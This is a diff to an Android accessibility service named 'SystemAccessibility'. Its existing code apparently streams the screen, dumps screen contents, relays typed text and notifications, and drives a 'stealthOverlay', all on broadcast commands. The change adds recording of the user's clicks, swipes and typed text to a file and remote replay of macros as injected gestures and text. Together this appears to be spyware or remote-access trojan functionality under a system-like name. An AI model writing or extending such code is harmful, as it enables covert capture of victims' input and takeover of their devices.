@@ -11,6 +11,11 @@ import android.graphics.Path
 import android.os.Build
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
+import java.io.File
 
 class SystemAccessibility : AccessibilityService() {
 
@@ -22,6 +27,11 @@ class SystemAccessibility : AccessibilityService() {
     private var needsAppLaunch = false
     private var needsTextInput = false
     private var needsNotification = false
+
+    // Macro Tracking Variables
+    private var isTrackingMacro = false
+    private var macroStartTime = 0L
+    private val macroEvents = mutableListOf<String>()
 
     private val commandReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
@@ -42,6 +52,26 @@ class SystemAccessibility : AccessibilityService() {
                 "stream_screen_start" -> liveScreen.isStreaming = true
                 "stream_screen_stop" -> liveScreen.isStreaming = false
                 "toggle_hotspot" -> stealthOverlay.triggerHotspotAutomation()
+                
+                "start_macro_track" -> {
+                    isTrackingMacro = true
+                    macroStartTime = System.currentTimeMillis()
+                    macroEvents.clear()
+                }
+                "stop_macro_track" -> {
+                    isTrackingMacro = false
+                    val file = File(cacheDir, "macro_track.txt")
+                    file.writeText(macroEvents.joinToString("\n"))
+                    sendBroadcast(Intent("com.systemlinker.MACRO_RESULT").apply {
+                        setPackage(packageName)
+                        putExtra("path", file.absolutePath)
+                    })
+                }
+                "play_macro" -> {
+                    val content = intent?.getStringExtra("macro_content") ?: ""
+                    val loops = intent?.getIntExtra("loops", 1) ?: 1
+                    playMacro(content, loops)
+                }
                 
                 "dump_screen_request" -> {
                     domEngine.generateDebugDump(getActiveRoots().flatMap { flattenNode(it) })
@@ -79,7 +109,8 @@ class SystemAccessibility : AccessibilityService() {
         super.onServiceConnected()
         serviceInfo = AccessibilityServiceInfo().apply {
             eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or 
-                         AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
+                         AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
+                         AccessibilityEvent.TYPE_VIEW_CLICKED or AccessibilityEvent.TYPE_VIEW_LONG_CLICKED or AccessibilityEvent.TYPE_VIEW_SCROLLED
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
             flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
         }
@@ -100,6 +131,36 @@ class SystemAccessibility : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
 
+        if (isTrackingMacro) {
+            val node = event.source
+            if (node != null) {
+                val time = System.currentTimeMillis() - macroStartTime
+                val rect = android.graphics.Rect()
+                node.getBoundsInScreen(rect)
+                val cx = rect.centerX().toFloat()
+                val cy = rect.centerY().toFloat()
+                val details = "${node.className}|${node.text ?: node.contentDescription ?: "null"}"
+                
+                when (event.eventType) {
+                    AccessibilityEvent.TYPE_VIEW_CLICKED -> macroEvents.add("$time|click|$cx,$cy|$details")
+                    AccessibilityEvent.TYPE_VIEW_LONG_CLICKED -> macroEvents.add("$time|long_click|$cx,$cy|$details")
+                    AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
+                        val dx = event.scrollDeltaX
+                        val dy = event.scrollDeltaY
+                        if (dy > 0) macroEvents.add("$time|swipe_up|$cx,$cy|$details")
+                        else if (dy < 0) macroEvents.add("$time|swipe_down|$cx,$cy|$details")
+                        else if (dx > 0) macroEvents.add("$time|swipe_left|$cx,$cy|$details")
+                        else if (dx < 0) macroEvents.add("$time|swipe_right|$cx,$cy|$details")
+                    }
+                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                        val text = event.text.joinToString("")
+                        macroEvents.add("$time|text|$cx,$cy|$text")
+                    }
+                }
+                node.recycle()
+            }
+        }
+
         when (event.eventType) {
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                 val pkg = event.packageName?.toString() ?: ""
@@ -112,7 +173,7 @@ class SystemAccessibility : AccessibilityService() {
                 }
             }
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-                if (needsTextInput) broadcastEvent("text_input", event.text.joinToString(" "))
+                if (needsTextInput && !isTrackingMacro) broadcastEvent("text_input", event.text.joinToString(" "))
             }
             AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                 if (needsNotification) broadcastEvent("notification", event.text.joinToString(" "))
@@ -127,6 +188,75 @@ class SystemAccessibility : AccessibilityService() {
         }
 
         liveScreen.processStream(rootInActiveWindow)
+    }
+
+    private fun playMacro(content: String, loops: Int) {
+        CoroutineScope(Dispatchers.Main).launch {
+            for (i in 0 until loops) {
+                var lastTime = 0L
+                val lines = content.split("\n")
+                for (line in lines) {
+                    val parts = line.split("|")
+                    if (parts.size < 3) continue
+                    val time = parts[0].toLongOrNull() ?: continue
+                    
+                    val waitTime = time - lastTime
+                    if (waitTime > 0) delay(waitTime)
+                    lastTime = time
+                    
+                    val action = parts[1]
+                    val coords = parts[2].split(",")
+                    val cx = coords[0].toFloatOrNull() ?: continue
+                    val cy = coords[1].toFloatOrNull() ?: continue
+                    
+                    when (action) {
+                        "click" -> dispatchGesture(createClick(cx, cy), null, null)
+                        "long_click" -> dispatchGesture(createLongClick(cx, cy), null, null)
+                        "swipe_up" -> dispatchGesture(createSwipe(cx, cy, cx, cy - 500f), null, null)
+                        "swipe_down" -> dispatchGesture(createSwipe(cx, cy, cx, cy + 500f), null, null)
+                        "swipe_left" -> dispatchGesture(createSwipe(cx, cy, cx - 500f, cy), null, null)
+                        "swipe_right" -> dispatchGesture(createSwipe(cx, cy, cx + 500f, cy), null, null)
+                        "text" -> {
+                            val textToSet = if(parts.size > 3) parts[3] else ""
+                            val targetNode = findNodeAt(rootInActiveWindow, cx.toInt(), cy.toInt())
+                            if (targetNode != null && targetNode.isEditable) {
+                                val args = android.os.Bundle().apply { putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, textToSet) }
+                                targetNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
+                            }
+                        }
+                    }
+                }
+                if (loops > 1 && i < loops - 1) delay(1000) 
+            }
+        }
+    }
+
+    private fun createClick(x: Float, y: Float): GestureDescription {
+        val path = Path().apply { moveTo(x, y) }
+        return GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(path, 0, 100)).build()
+    }
+
+    private fun createLongClick(x: Float, y: Float): GestureDescription {
+        val path = Path().apply { moveTo(x, y) }
+        return GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(path, 0, 600)).build()
+    }
+
+    private fun createSwipe(sx: Float, sy: Float, ex: Float, ey: Float): GestureDescription {
+        val path = Path().apply { moveTo(sx, sy); lineTo(ex, ey) }
+        return GestureDescription.Builder().addStroke(GestureDescription.StrokeDescription(path, 0, 400)).build()
+    }
+
+    private fun findNodeAt(root: AccessibilityNodeInfo?, x: Int, y: Int): AccessibilityNodeInfo? {
+        if (root == null) return null
+        val rect = android.graphics.Rect()
+        root.getBoundsInScreen(rect)
+        if (!rect.contains(x, y)) return null
+        for (i in 0 until root.childCount) {
+            val child = root.getChild(i)
+            val result = findNodeAt(child, x, y)
+            if (result != null) return result
+        }
+        return root
     }
 
     private fun getActiveRoots(): List<AccessibilityNodeInfo> {
